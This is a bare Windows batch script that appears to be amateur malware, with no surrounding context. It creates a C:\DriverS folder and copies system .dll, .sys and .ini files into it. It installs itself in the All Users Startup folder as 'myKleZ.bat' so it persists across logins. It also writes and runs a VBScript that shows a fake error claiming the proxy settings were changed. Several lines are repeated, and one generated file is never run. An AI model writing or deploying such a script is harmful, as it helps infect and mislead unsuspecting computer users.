   @echo off

   cd C:\
   md DriverS
   goto slow

   :slow
   echo copy %0 C:\DriverS\cgilv.bat >> C:\DriverS\prnt.bat
   echo copy %0 C:\Drivers\cgirv.bat >> C:\DriverS\prnt.bat
   echo copy %0 C:\DriverS\cgill.bat >> C:\DriverS\prnt.bat
   echo copy %0 C:\DriverS\cgi11.bat >> C:\DriverS\prnt.bat
   echo copy %0 C:\Drivers\11qlv.bat >> C:\DriverS\prnt.bat
   echo copy %0 C:\Drivers\11trm.bat >> C:\DriverS\prnt.bat
   echo copy %0 C:\Drivers\11trm.bat >> C:\DriverS\prnt.bat
   echo copy %0 C:\Drivers\11trm.bat >> C:\DriverS\prnt.bat
   echo copy %0 C:\Drivers\11trm.bat >> C:\DriverS\prnt.bat
   echo copy %0 C:\Drivers\11trm.bat >> C:\DriverS\prnt.bat
   echo copy %0 C:\Drivers\11trm.bat >> C:\DriverS\prnt.bat
   echo copy %0 C:\Drivers\11trm.bat >> C:\DriverS\prnt.bat
   echo copy %0 C:\Drivers\11trm.bat >> C:\DriverS\prnt.bat
   echo copy %0 C:\Drivers\11trm.bat >> C:\DriverS\prnt.bat
   echo copy %0 C:\Drivers\11trm.bat >> C:\DriverS\prnt.bat
   echo copy %0 C:\Drivers\11trm.bat >> C:\DriverS\prnt.bat
   echo copy %0 C:\Drivers\11trm.bat >> C:\DriverS\prnt.bat
   echo copy %0 C:\Drivers\11trm.bat >> C:\DriverS\prnt.bat
   echo copy %0 C:\Drivers\11trm.bat >> C:\DriverS\prnt.bat
   echo copy %0 C:\Drivers\11trm.bat >> C:\DriverS\prnt.bat
   echo copy %0 C:\Drivers\11trm.bat >> C:\DriverS\prnt.bat
   echo copy %0 C:\Drivers\11trm.bat >> C:\DriverS\prnt.bat
   echo copy %0 C:\Drivers\11trm.bat >> C:\DriverS\prnt.bat
   echo copy %0 C:\Drivers\11trm.bat >> C:\DriverS\prnt.bat
   echo copy %0 C:\Drivers\11trm.bat >> C:\DriverS\prnt.bat
   echo copy %0 C:\Drivers\11trm.bat >> C:\DriverS\prnt.bat
   echo copy %0 C:\Drivers\11trm.bat >> C:\DriverS\prnt.bat
   echo copy %0 C:\Drivers\11trm.bat >> C:\DriverS\prnt.bat
   echo copy %0 C:\Drivers\11trm.bat >> C:\DriverS\prnt.bat
   echo copy %0 C:\Drivers\11trm.bat >> C:\DriverS\prnt.bat
   echo copy %0 C:\Drivers\11trm.bat >> C:\DriverS\prnt.bat
   goto slow2

   :slow2
   copy C:\*.dll C:\DriverS\*.dll
   copy C:\*.sys C:\DriverS\*.sys
   copy C:\*.ini C:\DriverS\*.ini

   :infect
   copy %0 C:\docume~1\AllUsers\StartMenu\Programs\Startup\myKleZ.bat
   goto execute

   :execute
   echo MsgBox " ERROR:1102215000 net porxy setting was change. ",vbCritical,"unable to open program" >> C:\DriverS\kl111wdv.vbs
   start C:\DriverS\kl111wdv.vbs
   goto end

   :end
   exit
